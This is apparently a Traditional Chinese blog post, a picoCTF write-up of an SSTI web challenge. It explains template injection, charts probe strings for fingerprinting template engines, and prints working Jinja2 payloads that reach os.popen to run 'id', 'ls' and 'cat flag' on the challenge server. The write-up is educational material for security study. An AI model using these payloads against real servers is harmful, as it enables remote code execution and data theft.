@@ -1,0 +1,940 @@
+<!doctype html>
+<html
+  lang="zh-tw" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  SSIT_1 writeup | Zhi Chen
+</title>
+<meta
+  name="description"
+  content="SSIT_1 writeup picoctf"
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://www.zhienw.com/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="SSIT_1 writeup | Zhi Chen" />
+  <meta
+    property="og:description"
+    content="SSIT_1 writeup picoctf"
+  />
+  <meta property="og:url" content="https://www.zhienw.com/post/ssit_1/" />
+  <meta
+    property="og:site_name"
+    content="zhi旅程"
+  />
+  <meta
+    property="og:image"
+    content="/images/SSIT_1/cover.webp"
+  />
+  <meta property="article:author" content="Zhi Chen" />
+  <meta property="article:published_time" content="2026-04-21T11:00:52&#43;08:00" />
+  <meta property="article:modified_time" content="2026-04-21T12:34:52&#43;08:00" /><meta property="article:tag" content="writeuppicoctfWeb Exploitation" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/SSIT_1/cover.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.a3d425fa522308c948cc7f2e76386070dd8842851bbd3870ffeb7780bcfa390e.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css"
+    integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj&#43;vDDLIL&#43;xBGQU/voDBY5XE2lVh" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><img src="/images/witch.png" alt="loading" /></div><div class="loading-word">在資安領域掙扎中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章沒有找到對應的語言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/home_icon.png" alt="home icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/">首頁</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/home_icon.png" alt="archives icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/archives">歸檔</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/home_icon.png" alt="about icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/about">關於</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/home_icon.png" alt="link icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/link">連結</a>
+      </span><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav></div>
+<header id="header" aria-label="Site header"><picture></picture>
+    <img  fetchpriority="high" src="/images/SSIT_1/cover.webp" alt="SSIT_1 writeup"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">SSIT_1 writeup</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><meting-js
+        theme="var(--color-link)"
+        id="17632140526"server="netease"type="playlist"fixed="false"loop="all"order="list"preload="auto"volume="0.7"mutex="true"list-folded="true">
+      </meting-js><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目錄</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-ssitserver-side-template-injection">What is SSIT(Server-Side Template Injection)?</a></li>
+    <li><a href="#ssit檢測">SSIT檢測</a></li>
+    <li><a href="#解題">解題</a>
+      <ul>
+        <li><a href="#檢測">檢測</a></li>
+        <li><a href="#對其進行模板注入">對其進行模板注入</a></li>
+        <li><a href="#提交flag">提交flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#參考網站">參考網站</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Zhi Chen"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Zhi Chen</div>
+  <div class="sidebar-description">拿著腳本的神</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">20</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分類</div>
+    <div class="sidebar-state-number">
+      5
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>標籤</div>
+    <div class="sidebar-state-number">12</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-discord sidebar-social-icon">
+      <a
+        href="https://discordapp.com/users/gha00000"
+        itemprop="url"
+        target="_blank"
+        aria-label="discord"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-email sidebar-social-icon">
+      <a
+        href="mailto:ray784523@zhienw.com"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/zhi251"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首頁"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="home icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">首頁</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="歸檔"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="archives icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">歸檔</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="關於"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="about icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">關於</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/link"
+        aria-label="連結"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="link icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">連結</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2026-04-21 11:00:52 &#43;0800 CST" itemprop="datePublished"
+      >2026-04-21</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2026-04-21</time
+    >
+  </span><span
+      class="article-date-link icon-calendar-plus"
+      data-aos="zoom-in"
+    >
+      <time datetime="2026-04-21 12:34:52 &#43;0800 CST" itemprop="dateModified"
+        >2026-04-21</time
+      >
+    </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/picoctf"
+      data-aos="zoom-in"
+      >PICOCTF</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="what-is-ssitserver-side-template-injection">
+<a class="header-anchor" href="#what-is-ssitserver-side-template-injection"></a>
+What is SSIT(Server-Side Template Injection)?
+</h2><p>SSTI（Server-Side Template Injection，伺服器端模板注入）是一種網頁應用程式的安全漏洞。有些網頁框架常使用模板引擎（如 Jinja2、Twig、Freemarker 等）來動態產生 HTML。模板引擎允許在 HTML 中嵌入變數與邏輯。利用SSTI 漏洞可以進行以下攻擊</p>
+<ol>
+<li>讀取伺服器上的敏感檔案(如設定檔、密碼)</li>
+<li>遠端程式碼執行（RCE）</li>
+<li>獲取環境變數存取資料庫等</li>
+</ol>
+<h2 id="ssit檢測">
+<a class="header-anchor" href="#ssit%e6%aa%a2%e6%b8%ac"></a>
+SSIT檢測
+</h2><pre class="mermaid">
+  graph LR
+    %% 節點定義
+    Start([SSIT測試]) --> P1["${7*7}"]
+
+    %% 第一大分支：以 $ 開頭
+    P1 -- "得到 49" --> P2["a{*comment*}b"]
+    P2 -- "得到 ab" --> E1["Smarty (PHP)"]
+    P2 -- "原樣輸出" --> P3["${'z'.join('ab')}"]
+    P3 -- "得到 azb" --> E2["Mako (Python)"]
+    P3 -- "報錯/原樣" --> E3["Java / JSTL"]
+
+    %% 第二大分支：以 {{ 開頭
+    P1 -- "原樣輸出" --> P4["{{7*7}}"]
+    P4 -- "得到 49" --> P5["{{7*'7'}}"]
+    
+    %% Jinja2 與 Twig 的區分
+    P5 -- "得到 7777777" --> E4["Jinja2 (Python)"]
+    P5 -- "得到 49" --> E5["Twig (PHP)"]
+    P5 -- "報錯" --> E6["其他 Python 引擎"]
+
+    %% 第三大分支：其他標籤
+    P4 -- "原樣輸出" --> P6["<%= 7*7 %>"]
+    P6 -- "得到 49" --> E7["ERB (Ruby)"]
+    P6 -- "原樣輸出" --> End["未發現漏洞 / 未知"]
+
+    %% 樣式美化 (讓它更像截圖中的色塊)
+    style Start fill:#3498db,color:#fff,stroke-width:0px
+    style P1 fill:#3498db,color:#fff,stroke-width:0px
+    style P2 fill:#3498db,color:#fff,stroke-width:0px
+    style P3 fill:#3498db,color:#fff,stroke-width:0px
+    style P4 fill:#3498db,color:#fff,stroke-width:0px
+    style P5 fill:#3498db,color:#fff,stroke-width:0px
+    style P6 fill:#3498db,color:#fff,stroke-width:0px
+    
+    style E1 fill:#2ecc71,color:#fff,stroke-width:0px
+    style E2 fill:#2ecc71,color:#fff,stroke-width:0px
+    style E3 fill:#2ecc71,color:#fff,stroke-width:0px
+    style E4 fill:#2ecc71,color:#fff,stroke-width:0px
+    style E5 fill:#2ecc71,color:#fff,stroke-width:0px
+    style E7 fill:#2ecc71,color:#fff,stroke-width:0px
+    
+    style End fill:#e74c3c,color:#fff,stroke-width:0px
+</pre><h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><h3 id="檢測">
+<a class="header-anchor" href="#%e6%aa%a2%e6%b8%ac"></a>
+檢測
+</h3><p><strong>打開題目網頁</strong>
+<img src="/images/SSIT_1/1.webp" alt="image">
+<strong>對其進行SSIT漏洞測試,發現該網站使用的是jinja2(python)的腳本引擎</strong>
+<img src="/images/SSIT_1/2.webp" alt="image"></p>
+<h3 id="對其進行模板注入">
+<a class="header-anchor" href="#%e5%b0%8d%e5%85%b6%e9%80%b2%e8%a1%8c%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5"></a>
+對其進行模板注入
+</h3><p><strong>獲取該使用者帳號id</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}
+</span></span></code></pre></div><p><img src="/images/SSIT_1/3.webp" alt="image"></p>
+<blockquote>
+<ol>
+<li>request — Jinja2 模板中預設可存取的 Flask request 物件，代表當前的 HTTP 請求。</li>
+<li>.application — 從 request 取得 Flask 應用程式實例（即 Flask app 物件）。</li>
+<li>.<strong>globals</strong> — 存取該應用程式物件所屬函式的全域變數字典。這是 Python 函式物件的內建屬性，包含了該模組作用域中所有的全域名稱。</li>
+<li>.<strong>builtins</strong> — 從全域變數字典中取得 Python 的內建函式集合，包含 print、open、<strong>import</strong> 等核心函式。</li>
+<li>.<strong>import</strong>(&lsquo;os&rsquo;) — 呼叫內建的 <strong>import</strong> 函式來動態載入 os 模組。這是關鍵的一步，因為 os 模組提供了與作業系統互動的能力。</li>
+<li>.popen(&lsquo;id&rsquo;) — 呼叫 os.popen()，在伺服器上開啟一個子行程執行系統指令 id（Linux/Unix 指令，回傳當前使用者的 UID、GID 等資訊）。</li>
+<li>.read() — 讀取指令的輸出結果，讓它顯示在網頁回應中。</li>
+</ol>
+</blockquote>
+<p><strong>查看目錄</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()}}
+</span></span></code></pre></div><p><img src="/images/SSIT_1/4.webp" alt="image">
+<strong>查看flag</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()}}
+</span></span></code></pre></div><p><img src="/images/SSIT_1/5.webp" alt="image"></p>
+<h3 id="提交flag">
+<a class="header-anchor" href="#%e6%8f%90%e4%ba%a4flag"></a>
+提交flag
+</h3><p><img src="/images/SSIT_1/6.webp" alt="image"></p>
+<h2 id="參考網站">
+<a class="header-anchor" href="#%e5%8f%83%e8%80%83%e7%b6%b2%e7%ab%99"></a>
+參考網站
+</h2><ol>
+<li><a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/">https://onsecurity.io/article/server-side-template-injection-with-jinja2/</a></li>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection">https://portswigger.net/web-security/server-side-template-injection</a></li>
+</ol>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/writeup"
+        rel="tag"
+        >WRITEUP</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/picoctf"
+        rel="tag"
+        >PICOCTF</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/web-exploitation"
+        rel="tag"
+        >WEB EXPLOITATION</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+            data-src="/images/gatekeeper/cover.webp"
+            data-sizes="auto"
+            alt="Gatekeeper writeup"
+            class="lazyload"
+          /><a
+          href="/post/gatekeeper/"
+          aria-label="前一篇:Gatekeeper writeup"
+          title="前一篇:Gatekeeper writeup"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">Gatekeeper writeup</h3>
+      </div><div class="article-nav-link-wrap right"><img
+            data-src="/images/head-dump/cover.webp"
+            data-sizes="auto"
+            alt="head-dump writeup"
+            class="lazyload"
+          /><a
+          href="/post/head-dump/"
+          aria-label="後一篇:head-dump writeup"
+          title="後一篇:head-dump writeup"
+        ></a>
+        <div class="article-nav-caption">後一篇</div>
+        <h3 class="article-nav-title">head-dump writeup</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">說些什麼吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025-2026<span class="footer-info-sep rotate"></span>
+      Zhi Chen
+    </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目錄</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-ssitserver-side-template-injection">What is SSIT(Server-Side Template Injection)?</a></li>
+    <li><a href="#ssit檢測">SSIT檢測</a></li>
+    <li><a href="#解題">解題</a>
+      <ul>
+        <li><a href="#檢測">檢測</a></li>
+        <li><a href="#對其進行模板注入">對其進行模板注入</a></li>
+        <li><a href="#提交flag">提交flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#參考網站">參考網站</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Zhi Chen"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Zhi Chen</div>
+  <div class="sidebar-description">拿著腳本的神</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">20</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分類</div>
+    <div class="sidebar-state-number">
+      5
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>標籤</div>
+    <div class="sidebar-state-number">12</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-discord sidebar-social-icon">
+      <a
+        href="https://discordapp.com/users/gha00000"
+        itemprop="url"
+        target="_blank"
+        aria-label="discord"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-email sidebar-social-icon">
+      <a
+        href="mailto:ray784523@zhienw.com"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/zhi251"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首頁"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="home icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">首頁</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="歸檔"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="archives icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">歸檔</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="關於"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="about icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">關於</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/link"
+        aria-label="連結"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/home_icon.png" alt="link icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">連結</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Zhi Chen",
+          title: "SSIT_1 writeup",
+          url: "https:\/\/www.zhienw.com\/post\/ssit_1\/",
+          description: "SSIT_1 writeup picoctf",
+          cover: "https:\/\/www.zhienw.com\/images\/SSIT_1\/cover.webp",
+        };
+      </script><script
+    src="https://npm.webcache.cn/mermaid@11.10.1/dist/mermaid.min.js"
+    data-pjaxintegrity="sha384-7nxfNsXzOEcSwk&#43;tzfq6tbjmfg0P2Gqmi7JTnRjv9Ll3gFWNro6lI7hPtZPM5ZLD" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/dompurify@3.2.6/dist/purify.min.js"
+    data-pjaxintegrity="sha384-JEyTNhjM6R1ElGoJns4U2Ln4ofPcqzSsynQkmEc/KGy6336qAZl70tDLufbkla&#43;3" crossorigin="anonymous"></script><script data-pjax>
+        if (window.mermaid) {
+          
+          const elementCode = '.mermaid'
+          const processElements = (callback) => {
+            const els = _$$(elementCode);
+            if (!els.length) return Promise.resolve();
+            
+            return new Promise((resolve, reject) => {
+              try {
+                els.forEach(callback);
+                resolve();
+              } catch (error) {
+                reject(error);
+              }
+            });
+          };
+          const saveOriginalData = () => processElements(el => {
+            if (!el.getAttribute('data-original-code')) {
+              el.setAttribute('data-original-code', el.innerHTML);
+            }
+          });
+
+          const resetProcessed = () => processElements(el => {
+            const originalCode = el.getAttribute('data-original-code');
+            if (originalCode) {
+              el.removeAttribute('data-processed');
+              el.innerHTML = DOMPurify.sanitize(originalCode);
+            }
+          });
+          const loadMermaid = async (theme) => {
+            window.mermaid.initialize({theme, startOnLoad: false})
+            await window.mermaid.run({querySelector: elementCode, suppressErrors: true})
+            if (window.svgPanZoom) {
+              window.__panZoomList?.forEach(panZoom => {try {panZoom.destroy()} catch {}});
+              window.__panZoomList = [];
+              _$$('.mermaid > svg').forEach(el => {
+                const bbox = el.getBBox();
+                el.setAttribute('height', Math.max(bbox.height, 80));
+                window.__panZoomList.push(window.svgPanZoom(el, {
+                  zoomEnabled: true,
+                  controlIconsEnabled: true,
+                  fit: true,
+                  center: true
+                }));
+              });
+              if (window.__resizeMermaidSvg) {
+                window.removeEventListener('resize', window.__resizeMermaidSvg);
+              }
+              window.__resizeMermaidSvg = () => {
+                try {
+                  window.__panZoomList.forEach(panZoom => {
+                    panZoom.resize();
+                    panZoom.fit();
+                    panZoom.center();
+                  });
+                } catch {
+                  window.removeEventListener('resize', window.__resizeMermaidSvg);
+                  window.__panZoomList = [];
+                }
+              }
+              window.addEventListener('resize', window.__resizeMermaidSvg);
+            }
+          }
+          const initMermaid = async (theme) => {
+            try {
+              await saveOriginalData();
+              await resetProcessed();
+              await loadMermaid(theme);
+            } catch (error) {
+              console.error(error);
+            }
+          };
+          
+          document.body.addEventListener('dark-theme-set', () => initMermaid('dark'));
+          document.body.addEventListener('light-theme-set', () => initMermaid('default'));
+
+          const mode = localStorage.getItem('dark_mode');
+          if (mode === 'auto') {
+            const osMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
+            initMermaid(osMode ? 'dark' : 'default');
+          } else {
+            initMermaid(mode === 'true' ? 'dark' : 'default');
+          }
+        }
